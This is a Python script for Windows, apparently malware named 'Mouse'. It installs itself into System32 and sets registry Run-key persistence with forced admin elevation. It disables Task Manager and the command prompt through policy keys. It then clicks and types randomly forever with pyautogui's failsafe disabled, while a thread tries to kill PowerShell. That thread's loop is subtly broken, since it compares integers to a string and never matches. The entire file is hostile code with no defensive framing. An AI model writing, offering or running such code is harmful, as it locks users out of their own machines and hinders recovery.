import ctypes
import sys
from tkinter import messagebox
if not ctypes.windll.shell32.IsUserAnAdmin():
    messagebox.showerror("Mouse", "Please run file as an administrator")
    sys.exit(1)
if sys.platform != "win32":
    messagebox.showerror("Mouse", "This application is for Windows only")
    sys.exit(1)


import pyautogui
import random
import string
import subprocess
import threading
import time
size = pyautogui.size()
chars = string.ascii_letters + string.digits
pyautogui.FAILSAFE = False
import winreg
import shutil
try: shutil.copy("mouse.exe", "C:\\Windows\\System32\\mouse.exe")
except: pass
Run = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(Run, "Mouse", 0, winreg.REG_SZ, "C:\\Windows\\System32\\mouse.exe")
runasadmin = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(runasadmin, "C:\\Windows\\System32\\mouse.exe", 0, winreg.REG_SZ, "~RUNASADMIN")

def disable_things(key):
    DisTaskMgrAndRegistryTools = winreg.CreateKeyEx(key, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_ALL_ACCESS)
    DisCMD = winreg.CreateKeyEx(key, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(DisTaskMgrAndRegistryTools, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    # winreg.SetValueEx(DisTaskMgrAndRegistryTools, "DisableRegistryTools", 0, winreg.REG_DWORD, 1) --> Not recommend to use for Windows Home
    winreg.SetValueEx(DisCMD, "DisableCMD", 0, winreg.REG_DWORD, 1)

disable_things(winreg.HKEY_CURRENT_USER)
disable_things(winreg.HKEY_LOCAL_MACHINE)

def powershell_terminate():
    while True:
        tasklist = subprocess.getoutput("tasklist")
        for task in range(len(tasklist.split())):
            if task == "powershell.exe":
                subprocess.call(f"taskkill /f /im {task}")


threading.Thread(target=powershell_terminate).start()

while True:
    pyautogui.doubleClick(random.randint(0, size[0]), random.randint(0, size[1]))
    pyautogui.write(random.choice(chars))
